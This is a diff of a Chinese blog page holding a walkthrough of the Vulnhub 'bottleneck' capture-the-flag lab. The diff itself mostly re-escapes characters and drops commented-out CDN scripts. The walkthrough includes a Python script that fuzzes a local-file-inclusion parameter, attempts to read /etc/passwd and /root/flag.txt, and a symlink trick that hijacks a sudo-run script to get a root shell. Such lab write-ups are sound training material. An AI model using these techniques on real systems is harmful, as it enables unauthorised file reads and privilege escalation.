@@ -18,12 +18,12 @@
   <meta name="author" content="D3n13d">
   <meta name="keywords" content="Web,CTF,渗透测试">
   
-    <meta name="description" content="0x01:前言好久之前做的觉得还不错，今天给它发出来见见光 0x02:信息收集判断目标机器Ip为    192.168.1.53  几个扫描结果    得到的目录 12345&#x2F;css&#x2F;index.php&#x2F;js&#x2F;image_gallery.php&#x2F;img    主页的提示，并没有什么用  0x02:LFI漏洞利用在  &#x2F;image_gallery.php 中  发现图片存在 t 和 f 这两个参数，">
+    <meta name="description" content="0x01:前言好久之前做的觉得还不错，今天给它发出来见见光 0x02:信息收集判断目标机器Ip为    192.168.1.53  几个扫描结果    得到的目录 12345&#x2F;css&#x2F;index.php&#x2F;js&#x2F;image_gallery.php&#x2F;img    主页的提示，并没有什么用  0x02:LFI漏洞利用在  &#x2F;image_gallery.php 中  发现图片存在 t 和 f 这">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Vulnhub-bottleneck">
 <meta property="og:url" content="https://d3n13d.github.io/2022/01/30/Vulnhub-bottleneck/index.html">
 <meta property="og:site_name" content="D3n13d &#39;s blog">
-<meta property="og:description" content="0x01:前言好久之前做的觉得还不错，今天给它发出来见见光 0x02:信息收集判断目标机器Ip为    192.168.1.53  几个扫描结果    得到的目录 12345&#x2F;css&#x2F;index.php&#x2F;js&#x2F;image_gallery.php&#x2F;img    主页的提示，并没有什么用  0x02:LFI漏洞利用在  &#x2F;image_gallery.php 中  发现图片存在 t 和 f 这两个参数，">
+<meta property="og:description" content="0x01:前言好久之前做的觉得还不错，今天给它发出来见见光 0x02:信息收集判断目标机器Ip为    192.168.1.53  几个扫描结果    得到的目录 12345&#x2F;css&#x2F;index.php&#x2F;js&#x2F;image_gallery.php&#x2F;img    主页的提示，并没有什么用  0x02:LFI漏洞利用在  &#x2F;image_gallery.php 中  发现图片存在 t 和 f 这">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956986.png">
 <meta property="og:image" content="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956264.png">
@@ -88,6 +88,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/test.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
 
 
@@ -292,13 +293,13 @@
 
 <p>主页的提示，并没有什么用</p>
 <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956810.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h2 id="0x02-LFI漏洞利用"><a href="#0x02-LFI漏洞利用" class="headerlink" title="0x02:LFI漏洞利用"></a>0x02:LFI漏洞利用</h2><p>在  /image_gallery.php 中</p>
+<h2 id="0x02-LFI漏洞利用"><a href="#0x02-LFI漏洞利用" class="headerlink" title="0x02:LFI漏洞利用"></a>0x02:LFI漏洞利用</h2><p>在  &#x2F;image_gallery.php 中</p>
 <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956347.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>发现图片存在 t 和 f 这两个参数，猜测可能对应单词 time 和  file ,随后我尝试刷新</p>
 <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201301000447.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201301000678.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>两个数字还挺像的对吧 …(生硬了</p>
-<p>尝试burp重新发包 读取 /root/flag.txt   麻了，后来看了看别的老哥walkthrough 好多读/etc/passwd  记一下记一下</p>
+<p>尝试burp重新发包 读取 &#x2F;root&#x2F;flag.txt   麻了，后来看了看别的老哥walkthrough 好多读&#x2F;etc&#x2F;passwd  记一下记一下</p>
 <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300955883.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>没有返回内容，emmm，试试脚本弥补手速的缺陷？</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> datetime<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> time<br><br>url=<span class="hljs-string">&quot;http://192.168.1.53/image_gallery.php&quot;</span><br>r=requests.get(url=url)<br>res=r.text<br>dtime=datetime.datetime.now()<br>t=<span class="hljs-built_in">int</span>(time.mktime(dtime.timetuple()))<br>filename=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C:\\Users\\16476\\Desktop\\fuzz.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> filename.read().splitlines():<br>    word=line.strip(<span class="hljs-string">&quot;\r&quot;</span>).strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>    payload = base64.b64encode(word.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br>    <span class="hljs-built_in">print</span>(payload)<br>    <span class="hljs-keyword">try</span>:<br>        params=&#123;<br>            <span class="hljs-string">&#x27;t&#x27;</span>:t,<br>            <span class="hljs-string">&#x27;f&#x27;</span>:payload<br>        &#125;<br>        r1=requests.get(url=url,params=params)<br>        <span class="hljs-built_in">print</span>(r1.request.url)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;----------------start verify-&quot;</span>+word+<span class="hljs-string">&quot;--------------&quot;</span>)<br>        res=r1.text<br>        <span class="hljs-built_in">print</span>(res)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure>
@@ -306,7 +307,7 @@
 
 
 <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300955066.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>可以发现我们的请求被扔进了垃圾桶 ，这次时间应该是没啥问题 那问题可能出在文件名上？尝试读取../image_gallery.php的源码</p>
+<p>可以发现我们的请求被扔进了垃圾桶 ，这次时间应该是没啥问题 那问题可能出在文件名上？尝试读取..&#x2F;image_gallery.php的源码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">CHANGELOG</span><br><span class="hljs-comment">v1.1: Still testing without content.</span><br><span class="hljs-comment">    I&#x27;ve fixed that problem that <span class="hljs-doctag">@p</span>4w and <span class="hljs-doctag">@ska</span> notified me after hacker attack.</span><br><span class="hljs-comment">    Shit I&#x27;m too lazy to make a big review of my code.</span><br><span class="hljs-comment">    I think that the LFI problem can be mitigated with the blacklist.</span><br><span class="hljs-comment">    By the way to protect me from attackers, all malicious requests are immediately sent to the SOC</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">v1.0: Starting this beautiful gallery</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$tstamp</span> = time();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;t&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">include_once</span> <span class="hljs-string">&#x27;image_gallery_load.php&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>又发现个文件名 image_gallery_load.php 继续尝试获取源码</p>
@@ -326,7 +327,7 @@
 <h2 id="0x04-权限提升"><a href="#0x04-权限提升" class="headerlink" title="0x04:权限提升"></a>0x04:权限提升</h2><p>检查一下sudo的配置情况</p>
 <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956898.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201300956051.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>发现 clear_logs 指向了/opt/下的同名脚本，而www-data这个用户对clear_logs有完全控制的权限。但是要想以root权限运行还得切换到bytevsbyte这个用户下</p>
+<p>发现 clear_logs 指向了&#x2F;opt&#x2F;下的同名脚本，而www-data这个用户对clear_logs有完全控制的权限。但是要想以root权限运行还得切换到bytevsbyte这个用户下</p>
 <p>所以现在大概的思路就是 切换到bytevsbyte用户 并修改clear_logs的指向，指向我们自己的脚本</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">cd /tmp/<br>echo &quot;/bin/bash&quot; &gt; test.sh<br>chmod 777 test.sh<br> ln -snf /tmp/test.sh /var/www/html/web_utils/clear_logs #-s 软链接 (符号链接) -n 把符号链接视为一般目录 -f 强制执行<br></code></pre></td></tr></table></figure>
 
@@ -556,95 +557,6 @@
   
 </footer>
 
-<!-- SCRIPTS -->
-<!-- 
-  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":true,"trickleSpeed":80})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
-
-
-<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
-<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
-
-<!-- Plugins -->
-
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-  
-
-
-
-  
-    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
-  
-  
-    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
-  
-  
-    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
-  
-  
-    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
-  
-
-
-
-  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
-
-
-
-
-  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var title = document.getElementById('subtitle').title;
-      
-        typing(title);
-      
-    })(window, document);
-  </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
-<script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>
-
-
-
-<!-- 主题的启动项 保持在最底部 -->
-<script  src="/js/boot.js" ></script>
- -->
 
 
 
